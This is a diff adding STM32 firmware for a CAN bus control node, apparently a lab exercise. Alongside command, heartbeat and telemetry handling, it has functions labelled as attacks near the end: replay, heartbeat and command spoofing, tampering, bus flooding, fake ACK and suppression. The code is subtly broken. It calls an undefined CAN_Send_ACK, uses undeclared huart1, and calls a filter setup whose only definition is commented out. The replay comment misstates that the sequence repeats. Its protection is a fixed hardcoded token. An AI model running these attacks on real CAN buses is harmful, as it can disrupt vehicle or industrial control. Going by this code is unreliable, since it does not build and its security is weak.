@@ -1,0 +1,787 @@
+/******************************************************************************
+  * NODE C: Відправляє команди та ACK/ERR (подійно)
+  *         Приймає та моніторить всю телеметрію (0x120, 0x180, 0x08X)
+  *         Heartbeat кожну секунду (1 Hz)
+  ******************************************************************************
+  */
+
+/* Includes ------------------------------------------------------------------*/
+#include "main.h"
+#include <string.h>
+#include <stdio.h>
+#include <stdlib.h>
+
+/* Private variables ---------------------------------------------------------*/
+extern CAN_HandleTypeDef hcan;
+extern TIM_HandleTypeDef htim2;
+
+/* USER CODE BEGIN PV */
+// CAN Message IDs
+#define CAN_ID_CMD         0x040  // Commands (відправка)
+#define CAN_ID_ACK         0x041  // ACK/ERR (відправка)
+#define CAN_ID_HEARTBEAT   0x080  // Heartbeat Base ID
+#define CAN_ID_TLM_FAST    0x120  // Telemetry Fast (приймання)
+#define CAN_ID_TLM_SLOW    0x180  // Telemetry Slow (приймання)
+
+#define NODE_ID            0x03   // Node C ID
+
+// Security Token (для захисту від підробки команд)
+#define SECURITY_TOKEN     0xA5   // токен
+
+// Timing
+volatile uint32_t tick_counter = 0;
+volatile uint8_t flag_1s = 0;
+volatile uint8_t flag_5s = 0;
+
+// Command data structure
+typedef struct {
+    uint8_t cmd_id;
+    uint8_t arg0;
+    uint8_t arg1;
+    uint8_t arg2;
+    uint8_t token;
+    uint8_t sequence;
+    uint8_t crc8;
+    uint8_t version;
+} CAN_Command_t;
+
+// ACK/ERR structure
+typedef struct {
+    uint8_t cmd_id;
+    uint8_t sequence;
+    uint8_t result;   // 0=ACK, 1=ERR
+    uint8_t detail;   // Error code або додаткова інформація
+} CAN_AckErr_t;
+
+// Heartbeat
+typedef struct {
+    uint8_t node_id;
+    uint8_t status;
+    uint16_t uptime_s;
+    uint16_t can_tx_count;
+    uint16_t can_rx_count;
+} Heartbeat_t;
+
+Heartbeat_t hb_data = {0};
+
+// Statistics
+uint32_t can_tx_count = 0;
+uint32_t can_rx_count = 0;
+uint32_t can_errors = 0;
+
+// Sequence counter для команд
+uint8_t cmd_sequence = 0;
+
+// Monitoring data from other nodes
+typedef struct {
+    uint32_t last_seen_ms;
+    uint8_t alive;
+} NodeStatus_t;
+
+NodeStatus_t node_a_status = {0};
+NodeStatus_t node_b_status = {0};
+
+/* USER CODE END PV */
+
+/* Private function prototypes -----------------------------------------------*/
+void SystemClock_Config(void);
+static void MX_GPIO_Init(void);
+static void MX_CAN_Init(void);
+static void MX_TIM2_Init(void);
+static void MX_USART1_UART_Init(void);
+
+/* USER CODE BEGIN PFP */
+void CAN_Config_Filter(void);
+void CAN_Send_Command(uint8_t cmdID, uint8_t arg0, uint8_t arg1, uint8_t arg2);
+void CAN_Send_AckErr(uint8_t cmdID, uint8_t seq, uint8_t result, uint8_t detail);
+void CAN_Send_Heartbeat(void);
+void CAN_Process_Received(CAN_RxHeaderTypeDef *rxHeader, uint8_t *rxData);
+uint8_t CRC8_Calculate(uint8_t *data, uint8_t len);
+void Check_Node_Health(void);
+void LED_Toggle(void);
+void LED_Blink_Fast(uint8_t count);
+
+#ifdef USE_UART_DEBUG
+void Debug_Printf(const char *fmt, ...);
+#endif
+/* USER CODE END PFP */
+
+int main(void)
+{
+  /* USER CODE BEGIN 1 */
+
+  /* USER CODE END 1 */
+
+  HAL_Init();
+  SystemClock_Config();
+
+  MX_GPIO_Init();
+  MX_CAN_Init();
+  MX_TIM2_Init();
+  #ifdef USE_UART_DEBUG
+  MX_USART1_UART_Init();
+  #endif
+
+
+  /* USER CODE BEGIN 2 */
+
+  CAN_Config_Filter();
+
+  if (HAL_CAN_Start(&hcan) != HAL_OK) {
+      Error_Handler();
+  }
+
+  /* Активуємо повідомлення для FIFO0 (CMD/ACK) і FIFO1 (HB/діагностика) */
+    if (HAL_CAN_ActivateNotification(&hcan,
+            CAN_IT_RX_FIFO0_MSG_PENDING | CAN_IT_RX_FIFO1_MSG_PENDING) != HAL_OK) {
+        Error_Handler();
+    }
+
+  HAL_TIM_Base_Start_IT(&htim2);
+
+  hb_data.node_id = NODE_ID;
+  hb_data.status = 0;
+  hb_data.uptime_s = 0;
+
+  LED_Blink_Fast(3);
+
+  #ifdef USE_UART_DEBUG
+  Debug_Printf("\r\n=== CAN Node C Started (CTRL) ===\r\n");
+  Debug_Printf("CMD ID: 0x%03X | ACK ID: 0x%03X\r\n", CAN_ID_CMD, CAN_ID_ACK);
+  Debug_Printf("Security Token: 0x%02X\r\n", SECURITY_TOKEN);
+  #endif
+
+  // Відправка тестової команди при старті
+  HAL_Delay(2000);
+  CAN_Send_Command(0x01, 0x00, 0x00, 0x00); // CMD 0x01 = Reset counters
+
+  /* USER CODE END 2 */
+
+  while (1)
+  {
+    /* USER CODE BEGIN 3 */
+
+    if (flag_1s) {
+        flag_1s = 0;
+
+        // Відправка Heartbeat @ 1 Hz
+        CAN_Send_Heartbeat();
+
+        // Перевірка здоров'я інших вузлів
+        Check_Node_Health();
+
+        hb_data.uptime_s++;
+
+        LED_Toggle();
+
+        #ifdef USE_UART_DEBUG
+        Debug_Printf("Uptime: %u s | TX: %lu | RX: %lu | ERR: %lu\r\n",
+                     hb_data.uptime_s, can_tx_count, can_rx_count, can_errors);
+        Debug_Printf("  Node A: %s | Node B: %s\r\n",
+                     node_a_status.alive ? "ALIVE" : "DEAD",
+                     node_b_status.alive ? "ALIVE" : "DEAD");
+        #endif
+    }
+
+    if (flag_5s) {
+        flag_5s = 0;
+
+        // Періодична відправка тестової команди (для демонстрації)
+        // CAN_Send_Command(0x02, cmd_sequence, 0x00, 0x00); // CMD 0x02 = Change speed
+
+        #ifdef USE_UART_DEBUG
+        Debug_Printf("--- Periodic test command (disabled) ---\r\n");
+        #endif
+    }
+
+  }
+  /* USER CODE END 3 */
+}
+
+/* USER CODE BEGIN 4 */
+
+
+//void CAN_Config_Filter(void)
+//{
+//    CAN_FilterTypeDef canFilter;
+//
+//    // Filter 0: Mask mode - приймаємо все (0x000 - 0x7FF)
+//    canFilter.FilterBank = 0;
+//    canFilter.FilterMode = CAN_FILTERMODE_IDMASK;
+//    canFilter.FilterScale = CAN_FILTERSCALE_32BIT;
+//    canFilter.FilterIdHigh = 0x0000;   // ID = 0x000
+//    canFilter.FilterIdLow = 0x0000;
+//    canFilter.FilterMaskIdHigh = 0x0000;  // Mask = 0x000 (пропускає все)
+//    canFilter.FilterMaskIdLow = 0x0000;
+//    canFilter.FilterFIFOAssignment = CAN_RX_FIFO0;
+//    canFilter.FilterActivation = ENABLE;
+//    canFilter.SlaveStartFilterBank = 14;
+//
+//    if (HAL_CAN_ConfigFilter(&hcan, &canFilter) != HAL_OK) {
+//        Error_Handler();
+//    }
+//}
+
+/**
+  * Відправка команди з захистом (CRC8 + Token + Sequence)
+  *         Format: CmdID | Arg0 | Arg1 | Arg2 | Token | Seq | CRC8 | Ver
+  */
+void CAN_Send_Command(uint8_t cmdID, uint8_t arg0, uint8_t arg1, uint8_t arg2)
+{
+    CAN_TxHeaderTypeDef txHeader;
+    uint8_t txData[8];
+    uint32_t txMailbox;
+
+    txHeader.StdId = CAN_ID_CMD;
+    txHeader.ExtId = 0;
+    txHeader.RTR = CAN_RTR_DATA;
+    txHeader.IDE = CAN_ID_STD;
+    txHeader.DLC = 8;
+    txHeader.TransmitGlobalTime = DISABLE;
+
+    // Формування пакету
+    txData[0] = cmdID;
+    txData[1] = arg0;
+    txData[2] = arg1;
+    txData[3] = arg2;
+    txData[4] = SECURITY_TOKEN;
+    txData[5] = cmd_sequence++;
+    txData[6] = CRC8_Calculate(txData, 6); // CRC перших 6 байт
+    txData[7] = 0x01; // Version
+
+    if (HAL_CAN_AddTxMessage(&hcan, &txHeader, txData, &txMailbox) == HAL_OK) {
+        can_tx_count++;
+
+        #ifdef USE_UART_DEBUG
+        Debug_Printf("CMD TX: ID=0x%02X Seq=%u Token=0x%02X CRC=0x%02X\r\n",
+                     cmdID, txData[5], SECURITY_TOKEN, txData[6]);
+        #endif
+    } else {
+        can_errors++;
+    }
+}
+
+
+
+void CAN_Send_AckErr(uint8_t cmdID, uint8_t seq, uint8_t result, uint8_t detail)
+{
+    CAN_TxHeaderTypeDef txHeader;
+    uint8_t txData[8];
+    uint32_t txMailbox;
+
+    txHeader.StdId = CAN_ID_ACK;
+    txHeader.ExtId = 0;
+    txHeader.RTR = CAN_RTR_DATA;
+    txHeader.IDE = CAN_ID_STD;
+    txHeader.DLC = 8;
+    txHeader.TransmitGlobalTime = DISABLE;
+
+    txData[0] = cmdID;
+    txData[1] = seq;
+    txData[2] = result;   // 0=ACK, 1=ERR
+    txData[3] = detail;
+    txData[4] = 0x00;
+    txData[5] = 0x00;
+    txData[6] = 0x00;
+    txData[7] = 0x00;
+
+    if (HAL_CAN_AddTxMessage(&hcan, &txHeader, txData, &txMailbox) == HAL_OK) {
+        can_tx_count++;
+
+        #ifdef USE_UART_DEBUG
+        Debug_Printf("%s TX: CmdID=0x%02X Seq=%u Detail=0x%02X\r\n",
+                     result ? "ERR" : "ACK", cmdID, seq, detail);
+        #endif
+    }
+}
+
+void CAN_Send_Heartbeat(void)
+{
+    CAN_TxHeaderTypeDef txHeader;
+    uint8_t txData[8];
+    uint32_t txMailbox;
+
+    txHeader.StdId = CAN_ID_HEARTBEAT + NODE_ID;
+    txHeader.ExtId = 0;
+    txHeader.RTR = CAN_RTR_DATA;
+    txHeader.IDE = CAN_ID_STD;
+    txHeader.DLC = 8;
+    txHeader.TransmitGlobalTime = DISABLE;
+
+    hb_data.can_tx_count = (uint16_t)can_tx_count;
+    hb_data.can_rx_count = (uint16_t)can_rx_count;
+
+    txData[0] = hb_data.node_id;
+    txData[1] = hb_data.status;
+    txData[2] = (hb_data.uptime_s >> 8) & 0xFF;
+    txData[3] = hb_data.uptime_s & 0xFF;
+    txData[4] = (hb_data.can_tx_count >> 8) & 0xFF;
+    txData[5] = hb_data.can_tx_count & 0xFF;
+    txData[6] = (hb_data.can_rx_count >> 8) & 0xFF;
+    txData[7] = hb_data.can_rx_count & 0xFF;
+
+    if (HAL_CAN_AddTxMessage(&hcan, &txHeader, txData, &txMailbox) == HAL_OK) {
+        can_tx_count++;
+    }
+}
+
+
+void HAL_CAN_RxFifo0MsgPendingCallback(CAN_HandleTypeDef *hcan_ptr)
+{
+    CAN_RxHeaderTypeDef rxHeader;
+    uint8_t rxData[8];
+
+    if (HAL_CAN_GetRxMessage(hcan_ptr, CAN_RX_FIFO0, &rxHeader, rxData) == HAL_OK) {
+        can_rx_count++;
+        CAN_Process_Received(&rxHeader, rxData);
+    }
+}
+
+
+
+void CAN_Process_Received(CAN_RxHeaderTypeDef *rxHeader, uint8_t *rxData)
+{
+    uint32_t msgID = rxHeader->StdId;
+    uint32_t current_time = HAL_GetTick();
+
+    // Моніторинг телеметрії від Node A (0x120)
+    if (msgID == CAN_ID_TLM_FAST) {
+        node_a_status.last_seen_ms = current_time;
+        node_a_status.alive = 1;
+
+        // Розпакування GPS даних
+        int32_t lat = (rxData[0] << 16) | (rxData[1] << 8) | rxData[2];
+        if (lat & 0x800000) lat |= 0xFF000000; // Sign extend
+
+        int32_t lon = (rxData[3] << 16) | (rxData[4] << 8) | rxData[5];
+        if (lon & 0x800000) lon |= 0xFF000000;
+
+        uint8_t sats = rxData[6];
+        uint8_t fix = rxData[7];
+
+        #ifdef USE_UART_DEBUG
+        Debug_Printf("TLM_FAST RX: Lat=%ld Lon=%ld Sats=%u Fix=%u\r\n",
+                     lat, lon, sats, fix);
+        #endif
+    }
+    // Моніторинг телеметрії від Node B (0x180)
+    else if (msgID == CAN_ID_TLM_SLOW) {
+        node_b_status.last_seen_ms = current_time;
+        node_b_status.alive = 1;
+
+        // Розпакування ENV даних
+        int16_t temp = (rxData[0] << 8) | rxData[1];
+        uint16_t press = (rxData[2] << 8) | rxData[3];
+        uint8_t hum = rxData[4];
+        uint16_t lux = (rxData[5] << 8) | rxData[6];
+
+        #ifdef USE_UART_DEBUG
+        Debug_Printf("TLM_SLOW RX: T=%.1f°C P=%uhPa RH=%u%% Lux=%u\r\n",
+                     temp / 128.0f, press / 8, hum / 2, lux);
+        #endif
+    }
+    // Heartbeat від інших вузлів
+    else if ((msgID & 0xFF0) == CAN_ID_HEARTBEAT) {
+        uint8_t node_id = rxData[0];
+        uint8_t status = rxData[1];
+        uint16_t uptime = (rxData[2] << 8) | rxData[3];
+
+        #ifdef USE_UART_DEBUG
+        Debug_Printf("HB RX: Node=0x%02X Status=%u Uptime=%u s\r\n",
+                     node_id, status, uptime);
+        #endif
+
+        // Оновлення статусу вузлів
+        if (node_id == 0x01) {
+            node_a_status.last_seen_ms = current_time;
+            node_a_status.alive = 1;
+        } else if (node_id == 0x02) {
+            node_b_status.last_seen_ms = current_time;
+            node_b_status.alive = 1;
+        }
+    }
+    // Отримання команди (якщо хтось інший надсилає)
+    else if (msgID == CAN_ID_CMD) {
+        uint8_t cmdID = rxData[0];
+        uint8_t token = rxData[4];
+        uint8_t seq = rxData[5];
+        uint8_t crc_rx = rxData[6];
+
+        // Перевірка CRC
+        uint8_t crc_calc = CRC8_Calculate(rxData, 6);
+
+        if (crc_calc == crc_rx && token == SECURITY_TOKEN) {
+            #ifdef USE_UART_DEBUG
+            Debug_Printf("CMD RX: ID=0x%02X Seq=%u [VALID]\r\n", cmdID, seq);
+            #endif
+
+            // Можна відправити ACK
+            // CAN_Send_AckErr(cmdID, seq, 0, 0x00);
+        } else {
+            can_errors++;
+
+            #ifdef USE_UART_DEBUG
+            Debug_Printf("CMD RX: SECURITY ERROR (CRC or Token mismatch)\r\n");
+            #endif
+
+            // Відправка ERR
+            CAN_Send_AckErr(cmdID, seq, 1, 0x01); // ERR: Security fail
+        }
+    }
+    // ACK/ERR від інших вузлів
+    else if (msgID == CAN_ID_ACK) {
+        uint8_t cmdID = rxData[0];
+        uint8_t seq = rxData[1];
+        uint8_t result = rxData[2];
+
+        #ifdef USE_UART_DEBUG
+        Debug_Printf("%s RX: CmdID=0x%02X Seq=%u\r\n",
+                     result ? "ERR" : "ACK", cmdID, seq);
+        #endif
+    }
+}
+
+
+void Check_Node_Health(void)
+{
+    uint32_t current_time = HAL_GetTick();
+    uint32_t timeout = 5000; // 5 секунд
+
+    // Node A
+    if (node_a_status.alive && (current_time - node_a_status.last_seen_ms > timeout)) {
+        node_a_status.alive = 0;
+        hb_data.status = 1; // Warning
+
+        #ifdef USE_UART_DEBUG
+        Debug_Printf("WARNING: Node A timeout!\r\n");
+        #endif
+    }
+
+    // Node B
+    if (node_b_status.alive && (current_time - node_b_status.last_seen_ms > timeout)) {
+        node_b_status.alive = 0;
+        hb_data.status = 1; // Warning
+
+        #ifdef USE_UART_DEBUG
+        Debug_Printf("WARNING: Node B timeout!\r\n");
+        #endif
+    }
+
+    // Якщо обидва вузли мертві - критична помилка
+    if (!node_a_status.alive && !node_b_status.alive) {
+        hb_data.status = 2; // Error
+    } else if (node_a_status.alive && node_b_status.alive) {
+        hb_data.status = 0; // OK
+    }
+}
+
+uint8_t CRC8_Calculate(uint8_t *data, uint8_t len)
+{
+    uint8_t crc = 0x00;
+    for (uint8_t i = 0; i < len; i++) {
+        crc ^= data[i];
+        for (uint8_t j = 0; j < 8; j++) {
+            if (crc & 0x80) {
+                crc = (crc << 1) ^ 0x07;
+            } else {
+                crc <<= 1;
+            }
+        }
+    }
+    return crc;
+}
+
+
+void HAL_TIM_PeriodElapsedCallback(TIM_HandleTypeDef *htim)
+{
+    if (htim->Instance == TIM2) {
+        tick_counter++;
+
+        flag_1s = 1;
+
+        if (tick_counter % 5 == 0) {
+            flag_5s = 1;
+        }
+    }
+}
+
+void LED_Toggle(void)
+{
+    HAL_GPIO_TogglePin(GPIOC, GPIO_PIN_13);
+}
+
+void LED_Blink_Fast(uint8_t count)
+{
+    for (uint8_t i = 0; i < count; i++) {
+        HAL_GPIO_WritePin(GPIOC, GPIO_PIN_13, GPIO_PIN_RESET);
+        HAL_Delay(50);
+        HAL_GPIO_WritePin(GPIOC, GPIO_PIN_13, GPIO_PIN_SET);
+        HAL_Delay(50);
+    }
+}
+
+#ifdef USE_UART_DEBUG
+void Debug_Printf(const char *fmt, ...)
+{
+    char buffer[128];
+    va_list args;
+    va_start(args, fmt);
+    vsnprintf(buffer, sizeof(buffer), fmt, args);
+    va_end(args);
+    HAL_UART_Transmit(&huart1, (uint8_t*)buffer, strlen(buffer), HAL_MAX_DELAY);
+}
+#endif
+
+// ================================================================
+//                     1 — REPLAY ATTACK
+//   Повторна відправка тієї ж команди з тими ж аргументами.
+//   Token/Seq/CRC8 повторяться, бо генеруються у CAN_Send_Command.
+// ================================================================
+void Attack_Replay(uint8_t cmdID, uint8_t arg0, uint8_t arg1, uint8_t arg2)
+{
+    CAN_Send_Command(cmdID, arg0, arg1, arg2);
+    HAL_Delay(5);
+    CAN_Send_Command(cmdID, arg0, arg1, arg2);   // повтор
+}
+
+
+
+// ================================================================
+//                    2 — SPOOFING ATTACK
+//       2.1. Підробка Heartbeat від іншого вузла
+// ================================================================
+void Attack_Spoof_Heartbeat(uint8_t fake_node_id)
+{
+    uint16_t fake_id = 0x080 + fake_node_id;  // ID Heartbeat чужого вузла
+
+    CAN_TxHeaderTypeDef h;
+    h.StdId = fake_id;
+    h.IDE   = CAN_ID_STD;
+    h.RTR   = CAN_RTR_DATA;
+    h.DLC   = 1;
+
+    uint8_t payload = 0x55;
+
+    uint32_t mb;
+    HAL_CAN_AddTxMessage(&hcan, &h, &payload, &mb);
+}
+
+
+
+// ================================================================
+//                   2.2. Підробка керуючої команди
+// ================================================================
+void Attack_Spoof_Command(void)
+{
+    uint8_t fake_cmd  = 0xAB;  // фальшива команда
+    uint8_t a0 = 0x11;
+    uint8_t a1 = 0x22;
+    uint8_t a2 = 0x33;
+
+    CAN_Send_Command(fake_cmd, a0, a1, a2);
+}
+
+
+
+// ================================================================
+//                  3 — TAMPERING / MODIFY ATTACK
+//    Зловмисник підміняє один аргумент на шкідливий (0xFF).
+// ================================================================
+void Attack_Modify_Command(uint8_t cmdID, uint8_t real_a0, uint8_t real_a1)
+{
+    uint8_t malicious_a2 = 0xFF;   // підміна
+
+    CAN_Send_Command(cmdID, real_a0, real_a1, malicious_a2);
+}
+
+
+
+// ================================================================
+//                  4 — FLOODING (DoS)
+//    Засипаємо шину кадрами, блокуючи нормальний трафік
+// ================================================================
+void Attack_Flood(void)
+{
+    for (int i = 0; i < 200; i++)
+    {
+        CAN_Send_Heartbeat();
+        HAL_Delay(1);
+    }
+}
+
+
+
+// ================================================================
+//                5 — ПІДРОБКА ACK (маскування помилки)
+// ================================================================
+void Attack_Fake_ACK(uint8_t seq)
+{
+    CAN_Send_ACK(seq, 0x00); // ACK без помилок
+}
+
+
+
+// ================================================================
+//                  6 — SUPPRESSION ATTACK
+//    Глушіння: відправляємо високопріоритетні команди без пауз
+// ================================================================
+void Attack_Suppress_Node(void)
+{
+    for (int i = 0; i < 50; i++)
+    {
+        CAN_Send_Command(0xFF, 0x00, 0x00, 0x00);
+    }
+}
+
+
+
+// ================================================================
+//                  Attack Mode Handler
+//     Можна залишити як є або коментувати окремі атаки
+// ================================================================
+void Attack_Mode_Handler(void)
+{
+    HAL_Delay(3000); // Чекаємо поки вузли піднімуться
+
+    // 1 — Replay
+    Attack_Replay(0x01, 0x10, 0x20, 0x30);
+    HAL_Delay(300);
+
+    // 2 — Spoof heartbeat
+    Attack_Spoof_Heartbeat(2);
+    HAL_Delay(300);
+
+    // 3 — Tampering
+    Attack_Modify_Command(0x02, 0x44, 0x55);
+    HAL_Delay(300);
+
+    // 4 — Flood
+    Attack_Flood();
+    HAL_Delay(300);
+
+    // 5 — Fake ACK
+    Attack_Fake_ACK(5);
+    HAL_Delay(300);
+
+    // 6 — Suppression
+    Attack_Suppress_Node();
+}
+/* USER CODE END 4 */
+
+void SystemClock_Config(void)
+{
+  RCC_OscInitTypeDef RCC_OscInitStruct = {0};
+  RCC_ClkInitTypeDef RCC_ClkInitStruct = {0};
+
+  RCC_OscInitStruct.OscillatorType = RCC_OSCILLATORTYPE_HSE;
+  RCC_OscInitStruct.HSEState = RCC_HSE_ON;
+  RCC_OscInitStruct.HSEPredivValue = RCC_HSE_PREDIV_DIV1;
+  RCC_OscInitStruct.HSIState = RCC_HSI_ON;
+  RCC_OscInitStruct.PLL.PLLState = RCC_PLL_ON;
+  RCC_OscInitStruct.PLL.PLLSource = RCC_PLLSOURCE_HSE;
+  RCC_OscInitStruct.PLL.PLLMUL = RCC_PLL_MUL9;
+  if (HAL_RCC_OscConfig(&RCC_OscInitStruct) != HAL_OK)
+  {
+    Error_Handler();
+  }
+
+  RCC_ClkInitStruct.ClockType = RCC_CLOCKTYPE_HCLK|RCC_CLOCKTYPE_SYSCLK
+                              |RCC_CLOCKTYPE_PCLK1|RCC_CLOCKTYPE_PCLK2;
+  RCC_ClkInitStruct.SYSCLKSource = RCC_SYSCLKSOURCE_PLLCLK;
+  RCC_ClkInitStruct.AHBCLKDivider = RCC_SYSCLK_DIV1;
+  RCC_ClkInitStruct.APB1CLKDivider = RCC_HCLK_DIV2;
+  RCC_ClkInitStruct.APB2CLKDivider = RCC_HCLK_DIV1;
+
+  if (HAL_RCC_ClockConfig(&RCC_ClkInitStruct, FLASH_LATENCY_2) != HAL_OK)
+  {
+    Error_Handler();
+  }
+}
+
+static void MX_CAN_Init(void)
+{
+  hcan.Instance = CAN1;
+  hcan.Init.Prescaler = 9;
+  hcan.Init.Mode = CAN_MODE_NORMAL;
+  hcan.Init.SyncJumpWidth = CAN_SJW_1TQ;
+  hcan.Init.TimeSeg1 = CAN_BS1_6TQ;
+  hcan.Init.TimeSeg2 = CAN_BS2_1TQ;
+  hcan.Init.TimeTriggeredMode = DISABLE;
+  hcan.Init.AutoBusOff = ENABLE;
+  hcan.Init.AutoWakeUp = ENABLE;
+  hcan.Init.AutoRetransmission = ENABLE;
+  hcan.Init.ReceiveFifoLocked = DISABLE;
+  hcan.Init.TransmitFifoPriority = DISABLE;
+
+  if (HAL_CAN_Init(&hcan) != HAL_OK)
+  {
+    Error_Handler();
+  }
+}
+
+static void MX_TIM2_Init(void)
+{
+  TIM_ClockConfigTypeDef sClockSourceConfig = {0};
+  TIM_MasterConfigTypeDef sMasterConfig = {0};
+
+  htim2.Instance = TIM2;
+  htim2.Init.Prescaler = 7199;
+  htim2.Init.CounterMode = TIM_COUNTERMODE_UP;
+  htim2.Init.Period = 9999;
+  htim2.Init.ClockDivision = TIM_CLOCKDIVISION_DIV1;
+  htim2.Init.AutoReloadPreload = TIM_AUTORELOAD_PRELOAD_ENABLE;
+
+  if (HAL_TIM_Base_Init(&htim2) != HAL_OK)
+  {
+    Error_Handler();
+  }
+
+  sClockSourceConfig.ClockSource = TIM_CLOCKSOURCE_INTERNAL;
+  if (HAL_TIM_ConfigClockSource(&htim2, &sClockSourceConfig) != HAL_OK)
+  {
+    Error_Handler();
+  }
+
+  sMasterConfig.MasterOutputTrigger = TIM_TRGO_RESET;
+  sMasterConfig.MasterSlaveMode = TIM_MASTERSLAVEMODE_DISABLE;
+  if (HAL_TIMEx_MasterConfigSynchronization(&htim2, &sMasterConfig) != HAL_OK)
+  {
+    Error_Handler();
+  }
+}
+
+
+static void MX_GPIO_Init(void)
+{
+  GPIO_InitTypeDef GPIO_InitStruct = {0};
+
+  __HAL_RCC_GPIOC_CLK_ENABLE();
+  __HAL_RCC_GPIOD_CLK_ENABLE();
+  __HAL_RCC_GPIOA_CLK_ENABLE();
+  __HAL_RCC_GPIOB_CLK_ENABLE();
+
+  HAL_GPIO_WritePin(GPIOC, GPIO_PIN_13, GPIO_PIN_SET);
+
+  GPIO_InitStruct.Pin = GPIO_PIN_13;
+  GPIO_InitStruct.Mode = GPIO_MODE_OUTPUT_PP;
+  GPIO_InitStruct.Pull = GPIO_NOPULL;
+  GPIO_InitStruct.Speed = GPIO_SPEED_FREQ_LOW;
+  HAL_GPIO_Init(GPIOC, &GPIO_InitStruct);
+}
+
+void Error_Handler(void)
+{
+  __disable_irq();
+  while (1)
+  {
+    HAL_GPIO_TogglePin(GPIOC, GPIO_PIN_13);
+    HAL_Delay(100);
+  }
+}
+
+#ifdef  USE_FULL_ASSERT
+void assert_failed(uint8_t *file, uint32_t line)
+{
+}
+#endif
+
